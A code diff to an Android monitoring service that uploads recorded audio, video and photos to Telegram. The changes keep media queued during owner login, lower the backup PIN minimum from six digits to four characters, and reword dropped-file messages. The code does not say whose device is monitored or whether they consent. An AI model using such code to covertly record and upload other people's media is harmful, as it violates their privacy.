@@ -3006,7 +3006,7 @@ class MonitoringService : Service() {
         pending.stage = RESTORE_STAGE_PIN
         pending.at = SystemClock.elapsedRealtime()
         pending.attempts = 0
-        sendToTelegram("🔐 File diterima. Balas PIN backup (minimal 6 digit), atau /pulihkan batal.")
+        sendToTelegram("🔐 File diterima. Balas PIN/frasa sandi backup (minimal 4 karakter), atau /pulihkan batal.")
     }
 
     private suspend fun handleRestorePin(
@@ -9005,10 +9005,7 @@ class MonitoringService : Service() {
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.DROPPED
             }
-            if (awaitingOwnerLogin()) {
-                deleteQuietly(audioFile)
-                return MediaSendOutcome.DROPPED
-            }
+            if (awaitingOwnerLogin()) return MediaSendOutcome.KEPT
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
@@ -9194,10 +9191,7 @@ class MonitoringService : Service() {
                 deleteQuietly(videoFile)
                 return MediaSendOutcome.DROPPED
             }
-            if (awaitingOwnerLogin()) {
-                deleteQuietly(videoFile)
-                return MediaSendOutcome.DROPPED
-            }
+            if (awaitingOwnerLogin()) return MediaSendOutcome.KEPT
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
@@ -9280,7 +9274,7 @@ class MonitoringService : Service() {
             }
             if (droppedVideos > 0) {
                 try {
-                    messageQueue.addMessage("⚠️ $droppedVideos berkas video ditolak Telegram (400) — kosong/tak didukung, dibuang.", true)
+                    messageQueue.addMessage("⚠️ $droppedVideos berkas video tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang.", true)
                     MessageScheduler.scheduleMessageSend(this)
                 } catch (_: Exception) {
                 }
@@ -9358,7 +9352,7 @@ class MonitoringService : Service() {
             }
             if (droppedAudio > 0) {
                 try {
-                    messageQueue.addMessage("\u26A0\uFE0F $droppedAudio berkas rekaman ditolak Telegram (400) — kosong/tak didukung, dibuang.", true)
+                    messageQueue.addMessage("\u26A0\uFE0F $droppedAudio berkas rekaman tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang.", true)
                     MessageScheduler.scheduleMessageSend(this)
                 } catch (_: Exception) {
                 }
@@ -9552,10 +9546,7 @@ class MonitoringService : Service() {
                 deleteQuietly(photoFile)
                 return MediaSendOutcome.DROPPED
             }
-            if (awaitingOwnerLogin()) {
-                deleteQuietly(photoFile)
-                return MediaSendOutcome.DROPPED
-            }
+            if (awaitingOwnerLogin()) return MediaSendOutcome.KEPT
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
@@ -9652,7 +9643,7 @@ class MonitoringService : Service() {
             }
             if (droppedPhotos > 0) {
                 try {
-                    messageQueue.addMessage("\u26A0\uFE0F $droppedPhotos berkas foto ditolak Telegram (400) — kosong/tak didukung, dibuang.", true)
+                    messageQueue.addMessage("\u26A0\uFE0F $droppedPhotos berkas foto tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang.", true)
                     MessageScheduler.scheduleMessageSend(this)
                 } catch (_: Exception) {
                 }
